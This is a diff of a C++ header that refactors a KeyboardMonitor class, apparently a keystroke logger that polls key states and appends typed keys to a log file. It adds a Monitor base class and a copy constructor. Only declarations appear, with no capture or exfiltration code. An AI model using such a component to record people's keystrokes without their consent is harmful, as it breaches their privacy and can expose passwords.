@@ -7,6 +7,7 @@
 #include <stdio.h>
 
 #include "BaseEvent.h"
+#include "Monitor.h"
 
 #define KEY_CURRENTLY_PRESSED_MASK (1 << 15)
 #define KEY_PRESSED_SINCE_LAST_CALL 1
@@ -16,7 +17,8 @@
 class KeyboardEvent : public BaseEvent
 {
 public:
-	explicit KeyboardEvent(short virtualKeyCode);
+	KeyboardEvent(short virtualKeyCode);
+	KeyboardEvent(const KeyboardEvent& other);
 	~KeyboardEvent(void) {};
 
 	char getCharacter(void)
@@ -50,23 +52,24 @@ private:
 	short m_virtualKeyCode;
 };
 
-class KeyboardMonitor
+class KeyboardMonitor : public Monitor
 {
 public:
 	KeyboardMonitor(void);
-	KeyboardMonitor(std::string m_logFilePath);
-	KeyboardMonitor(std::string m_logFilePath, unsigned int maxListSize);
+	KeyboardMonitor(const std::string m_logFilePath);
+	KeyboardMonitor(const std::string m_logFilePath, unsigned int maxListSize);
 	~KeyboardMonitor(void);
 
-	void operator()();
+#pragma region Monitor overrides
+public:
+	virtual void operator()();
+#pragma endregion
 
 private:
 	bool appendToFile(void);
 
 private:
 	unsigned int m_maxListSize;
-	bool m_writeToLog;
-	std::string m_logFilePath;
 
 	std::list<KeyboardEvent> m_keyboardEventList;
 };
